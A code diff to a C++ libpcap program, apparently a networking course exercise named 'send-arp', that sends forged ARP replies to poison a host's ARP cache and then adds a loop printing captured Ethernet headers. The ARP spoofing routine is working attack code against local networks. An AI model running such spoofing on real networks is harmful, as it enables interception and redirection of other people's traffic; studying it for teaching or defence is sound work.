@@ -27,6 +27,14 @@ void usage() {
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
+void print_mac(const u_int8_t *m) {
+    printf("%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
+}
+
+void print_ip(struct in_addr *ip_addr) {
+	printf("%s", inet_ntoa(*ip_addr));
+}
+
 bool getMyAddr(const char* dev, Mac& my_mac, Ip& my_ip) {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
@@ -172,13 +180,36 @@ int main(int argc, char* argv[])
 		printf("sender ip: %s\n", std::string(sender_ip).c_str());
         printf("target ip: %s\n", std::string(target_ip).c_str());
 
+		// Sending arp packet & Parsing sender mac
 		sender_mac = getSenderMac(handle, my_mac, my_ip, sender_ip);
 		
-		// Send arp spoofing to target
+		// Sending arp spoofing to target
 		printf("======================\n");
 		printf("[Sending Spoof Packet]\n");
 		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
 		printf("done\n");
+
+		// listening the packet
+		while(true)
+		{
+			struct pcap_pkthdr* listen_header;
+			const u_char* listen_packet;
+			int res = pcap_next_ex(handle, &listen_header, &listen_packet);
+			if (res == 0) continue;
+			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+				break;
+			}
+
+			struct EthHdr *eth_hdr = (struct EthHdr *)listen_packet;
+			printf("dmac: %s", std::string(eth_hdr->dmac_).c_str());
+			printf(" | smac: %s", std::string(eth_hdr->smac_).c_str());
+			printf(" | type: %d\n", eth_hdr->type_);
+		}
+
+
+
+
 	}
 	pcap_close(handle);
     return 0;
